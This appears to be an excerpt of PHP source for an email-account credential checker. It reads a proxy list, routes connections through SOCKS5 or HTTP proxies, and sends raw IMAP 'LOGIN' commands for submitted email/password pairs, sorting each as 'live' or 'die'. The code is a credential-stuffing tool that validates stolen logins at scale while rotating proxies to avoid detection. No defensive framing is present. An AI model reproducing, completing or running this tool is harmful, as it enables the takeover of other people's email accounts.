...
if($action==='init'){
$proxies=array();
$f=__DIR__.'/proxies.txt';
if(file_exists($f)){
$c=@file_get_contents($f);
$lines=array_filter(array_map('trim',explode(LF,$c)));
...
if(empty($proxy)){ob_end_clean();echo json_encode(array('status'=>'fail'));exit;}
$ok=testProxy($proxy);
ob_end_clean();
...
$proxy=isset($_POST['proxy'])?$_POST['proxy']:'';
if(empty($email)||empty($password)){ob_end_clean();echo json_encode(array('status'=>'die','email'=>$email,'reason'=>'Vazio'));exit;}
try{$result=doValidate($email,$password,$proxy);}catch(\Throwable $e){$result=array('status'=>'die','email'=>$email,'reason'=>'Erro');}
ob_end_clean();
...
if($p['type']==='socks5'){curl_setopt($ch,CURLOPT_PROXYTYPE,7);}
else{curl_setopt($ch,CURLOPT_PROXYTYPE,0);curl_setopt($ch,CURLOPT_HTTPPROXYTUNNEL,true);}
if(!empty($p['user'])){curl_setopt($ch,CURLOPT_PROXYUSERPWD,$p['user'].':'.$p['pass']);}
$r=curl_exec($ch);
curl_close($ch);
return($r!==false&&strlen(trim($r))>0);}
...
if($r!==false)return array('status'=>'live','email'=>$email,'reason'=>'OK');
return null;}
...
$se=str_replace(array(chr(92),chr(34)),array(chr(92).chr(92),chr(92).chr(34)),$email);
$sp=str_replace(array(chr(92),chr(34)),array(chr(92).chr(92),chr(92).chr(34)),$password);
$cmd='A1 LOGIN '.DQ.$se.DQ.' '.DQ.$sp.DQ.CRLF;
fwrite($socket,$cmd);
$response='';
